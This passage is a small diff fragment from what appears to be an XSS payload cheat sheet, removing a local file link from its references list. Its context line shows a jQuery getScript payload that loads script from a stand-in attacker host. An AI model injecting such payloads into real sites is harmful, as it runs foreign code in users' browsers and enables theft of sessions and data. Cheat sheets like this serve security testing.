@@ -454,5 +454,4 @@ $.getScript`//attacker.com/xss.js`
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
 - https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
-- file:///E:/Bug%20Bounty/5-Client-Side/xss-cheatsheet.html
 
